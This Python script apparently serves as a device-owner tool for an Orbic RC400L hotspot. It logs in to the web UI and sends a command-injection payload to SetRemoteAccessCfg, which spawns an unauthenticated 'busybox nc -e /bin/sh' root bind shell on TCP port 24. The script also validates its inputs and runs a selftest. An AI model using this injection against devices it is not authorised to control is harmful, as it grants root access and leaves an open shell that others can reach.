#!/usr/bin/env python3
"""Re-open the RC400L root shell on TCP :24 without the password in argv.

This is the WRITE counterpart to the read-only `orbic-shell.py`. Upstream's
`installer util orbic-start-telnet` performs the same single command injection
(`installer/src/orbic_network.rs`): it authenticates to the stock web UI, then
POSTs a crafted body to `/action/SetRemoteAccessCfg` that starts
`busybox nc -ll -p 24 -e /bin/sh`. The documented re-open command passes the
admin password as `--admin-password <PASS>`, which exposes it in the process
list and shell history. This tool runs the identical injection but reads the
password from the mode-600 file `~/.claude-secrets/orbic-admin.txt` (or
`--password-file PATH`) via the self-tested `orbic-ui-read.py` login machinery,
so the secret never appears in any argv or transcript.

The `:24` shell is not reboot-persistent, so it must be re-opened after every
device reboot before `orx rescue`, `orx uninstall`, or `orbic-shell.py` can
use it (docs/INSTALL.md, docs/BACKUP-AND-RECOVERY.md).

Usage:
    scripts/orbic-open-shell.py --selftest
    scripts/orbic-open-shell.py [--ip 192.168.1.1] [--port 24]
        [--password-file PATH] [--timeout SECONDS]

The injection payload is upstream's own public exploit string, not a secret.
"""

from __future__ import annotations

import argparse
import importlib.util
import ipaddress
import json
import math
import socket
import sys
import time
from pathlib import Path

# orbic-ui-read.py sits beside this file in the repo working tree.
UI_READ = Path(__file__).resolve().parent / "orbic-ui-read.py"

DEFAULT_IP = "192.168.1.1"
DEFAULT_PORT = 24
USERNAME = "admin"

# Byte-for-byte the body from installer/src/orbic_network.rs (v0.13.0), with the
# port substituted. `_selftest` asserts this still matches that source.
INJECT_TEMPLATE = '{{"password": "\\"; busybox nc -ll -p {port} -e /bin/sh & #"}}'


def _load_ui_read():
    """Import orbic-ui-read.py as a module (its CLI is guarded under __main__)."""
    if not UI_READ.exists():
        raise SystemExit(f"cannot load {UI_READ}: file not found")
    spec = importlib.util.spec_from_file_location("orbic_ui_read", UI_READ)
    if spec is None or spec.loader is None:
        raise SystemExit(f"cannot load {UI_READ}")
    module = importlib.util.module_from_spec(spec)
    # Register before executing so annotation/dataclass resolution can find it.
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


def _validate(ip: str, port: int, timeout: float) -> None:
    """Fail closed on bad network arguments before touching the device.

    `--port 0` is the dangerous case: it would authenticate and inject
    `busybox nc -ll -p 0 ...`, spawning an unauthenticated root shell on an
    arbitrary ephemeral port that persists until reboot.
    """
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        raise SystemExit(f"invalid --ip {ip!r}: not an IP address literal")
    if not 1 <= port <= 65535:
        raise SystemExit(f"invalid --port {port}: must be 1..65535")
    if not (math.isfinite(timeout) and timeout > 0):
        raise SystemExit(f"invalid --timeout {timeout}: must be positive and finite")


def port_open(ip: str, port: int, timeout: float = 4.0) -> bool:
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except OSError:
        return False


def open_shell(
    ip: str,
    port: int,
    password_file: Path | None,
    timeout: float,
) -> int:
    _validate(ip, port, timeout)

    # Cap each probe so a dropped SYN cannot burn the whole budget on one try.
    probe = min(timeout, 2.0)
    if port_open(ip, port, probe):
        print(f"ok: {ip}:{port} already open")
        return 0

    ui = _load_ui_read()
    pw_path = password_file or ui.DEFAULT_PASSWORD_FILE
    password = ui.read_password(pw_path)  # mode-600 file, never argv
    session = ui.Session(ip)
    try:
        session.login(USERNAME, password)
        del password
        body = INJECT_TEMPLATE.format(port=port).encode()
        status, result = session.request("POST", "/action/SetRemoteAccessCfg", body)
        retcode = result.get("retcode") if isinstance(result, dict) else None
        print(f"SetRemoteAccessCfg -> HTTP {status}, retcode {retcode}")
    finally:
        try:
            session.logout()
        except Exception:  # noqa: BLE001, S110 - cleanup must never mask the result
            pass

    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        probe = min(1.0, max(0.1, deadline - time.monotonic()))
        if port_open(ip, port, probe):
            print(f"ok: {ip}:{port} root shell listener is up")
            return 0
        time.sleep(0.5)
    print(f"error: {ip}:{port} did not open after injection", file=sys.stderr)
    return 1


def _selftest() -> int:
    """Offline checks only; never touches a device."""
    failures = []

    # 1) The payload still matches upstream's exploit string exactly. The Rust
    #    source uses format!'s {{/}} brace escaping; the rendered body (what
    #    reaches the device) collapses those to single braces.
    src = UI_READ.parent.parent / "upstream" / "installer" / "src" / "orbic_network.rs"
    upstream_populated = (UI_READ.parent.parent / "upstream" / "Cargo.toml").exists()
    if src.exists():
        text = src.read_text(encoding="utf-8")
        upstream_literal = (
            r'{{"password": "\"; busybox nc -ll -p {TELNET_PORT} -e /bin/sh & #"}}'
        )
        if upstream_literal not in text:
            failures.append(
                "upstream payload changed: orbic_network.rs no longer contains "
                "the expected SetRemoteAccessCfg body"
            )
        upstream_rendered = upstream_literal.replace("{{", "{").replace("}}", "}")
        rendered = INJECT_TEMPLATE.format(port="{TELNET_PORT}")
        if rendered != upstream_rendered:
            failures.append(f"INJECT_TEMPLATE does not match upstream: {rendered!r}")
    elif upstream_populated:
        # Fail closed: the submodule is checked out but the file is gone
        # (upstream renamed/removed it), which defeats the drift check.
        failures.append(f"upstream is populated but {src} is missing")
    else:
        print(f"note: {src} absent (submodule not checked out); payload check skipped")

    # 2) A concrete port renders valid JSON with the listener command.
    body = INJECT_TEMPLATE.format(port=DEFAULT_PORT)
    try:
        parsed = json.loads(body)
    except json.JSONDecodeError as exc:
        failures.append(f"rendered body is not valid JSON: {exc}")
    else:
        if f"nc -ll -p {DEFAULT_PORT} -e /bin/sh" not in parsed.get("password", ""):
            failures.append("rendered body missing the listener command")

    # 3) No password-bearing CLI flag exists.
    parser = _build_parser()
    for action in parser._actions:
        for opt in action.option_strings:
            if "password" in opt and "file" not in opt:
                failures.append(f"password-bearing CLI flag present: {opt}")

    # 4) Argument validation fails closed on the dangerous inputs.
    for ip, port, timeout, why in [
        ("192.168.1.1", 0, 8.0, "port 0"),
        ("192.168.1.1", 70000, 8.0, "port > 65535"),
        ("not-an-ip", 24, 8.0, "hostname ip"),
        ("192.168.1.1", 24, 0.0, "zero timeout"),
        ("192.168.1.1", 24, float("inf"), "infinite timeout"),
    ]:
        try:
            _validate(ip, port, timeout)
        except SystemExit:
            pass
        else:
            failures.append(f"_validate accepted bad input: {why}")

    # 5) The orbic-ui-read.py interface this tool depends on is present.
    try:
        ui = _load_ui_read()
    except SystemExit as exc:
        failures.append(f"cannot load orbic-ui-read.py: {exc}")
    else:
        for symbol in ("DEFAULT_PASSWORD_FILE", "read_password", "Session"):
            if not hasattr(ui, symbol):
                failures.append(f"orbic-ui-read.py is missing {symbol}")

    for msg in failures:
        print(f"FAIL: {msg}", file=sys.stderr)
    if failures:
        return 1
    print("orbic-open-shell selftest: ok")
    return 0


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--selftest", action="store_true")
    parser.add_argument("--ip", default=DEFAULT_IP)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument(
        "--password-file",
        type=Path,
        default=None,
        help="mode-600 file holding the admin password (default: orbic-ui-read's)",
    )
    parser.add_argument("--timeout", type=float, default=8.0)
    return parser


def main(argv: list[str]) -> int:
    args = _build_parser().parse_args(argv)
    if args.selftest:
        return _selftest()
    return open_shell(args.ip, args.port, args.password_file, args.timeout)


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
